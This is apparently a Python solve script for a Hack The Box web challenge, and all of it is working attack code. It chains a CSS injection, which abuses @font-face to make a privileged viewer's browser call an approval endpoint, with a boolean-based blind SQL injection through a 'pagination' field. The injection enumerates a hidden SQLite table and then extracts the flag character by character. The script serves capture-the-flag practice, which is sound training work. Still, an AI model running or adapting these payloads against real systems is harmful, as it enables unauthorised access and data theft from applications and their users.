import requests
from time import sleep

SERVER_URL = "HTB_SERVER_ADDR_HERE"
TOKEN = "PUT_YOUR_APPROVE_TOKEN_HERE"

def approve_request():
    payload= f"""
    .d-none {{ display: block !important; }}
    
    #approvalToken {{
        font-family: 'vuln';
    }}
    
    @font-face {{
        font-family: 'vuln';
        src: url("/approve/1/{''.join(sorted(TOKEN))}");
    }}
    """
    try:
        print(payload)
        response = requests.post(SERVER_URL+"/api/submission/submit", json={"customCSS": payload})
        print("submissionID 1 approved")
        return response.text
    except Exception as error:
        print(f"Error : {error}")
        return None

def send_post_request(payload):
    try:
        response = requests.post(SERVER_URL+"/api/comment/entries", json=payload)
        if response.ok and "Something went wrong!" not in response.text:
            return response.text
    except Exception as error:
        print(f"Error during request: {error}")
    return None

def discover_table_name():
    query_template = (
        "(CASE WHEN EXISTS (SELECT 1 FROM sqlite_master WHERE name LIKE '{table_name}%') "
        "THEN 1 ELSE 0 END)"
    )
    table_name = "flag_"
    partial_flag_found = False
    for _ in range(4):  #4-character table suffix
        for ascii_value in range(256):
            if partial_flag_found:
                partial_flag_found=False
                break
            suffix = f"{ascii_value:02X}".lower()
            payload = query_template.format(table_name=table_name + suffix)
            print(payload)
            response = send_post_request({"pagination": payload, "submissionID": 1})
            if len(response)>2:
                table_name += suffix
                partial_flag_found = True
                sleep(1)
                print(f"Discovered table name: {table_name}")
        else:
            print("Failed to discover the next part of the table name.")
            break
    return table_name

def discover_flag_characters(table_name):

    query_template = (
        "(CASE WHEN EXISTS (SELECT flag FROM {table} WHERE flag LIKE 'HTB{partial_flag}{character}%') "
        "THEN 1 ELSE 0 END)"
    )
    discovered_flag = ""
    allowed_characters = (
        "".join(chr(i) for i in range(33, 127) if i not in {37, 39, 95}) + "_"
    )
    partial_flag_found = False
    while "}" not in discovered_flag:
        for char in allowed_characters:
            if partial_flag_found:
                partial_flag_found=False
                break
            payload = query_template.format(
                table=table_name,
                partial_flag=discovered_flag,
                character=char,
            )
            response = send_post_request({"pagination": payload, "submissionID": 1})
            if len(response)>2:
                discovered_flag += char
                partial_flag_found= True
                print(f"Discovered flag so far: {discovered_flag}")

    return discovered_flag

def main():
    approve_request()
    sleep(7)
    print("Starting table name discovery...")
    table_name = discover_table_name()

    if table_name:
        print(f"Table name discovered: {table_name}")
        print("Starting flag discovery...")
        flag = discover_flag_characters(table_name)
        if flag:
            print(f"Discovered flag: {flag}")
        else:
            print("Failed to discover the flag.")
    else:
        print("Failed to discover the table name.")

if __name__ == "__main__":
    main()
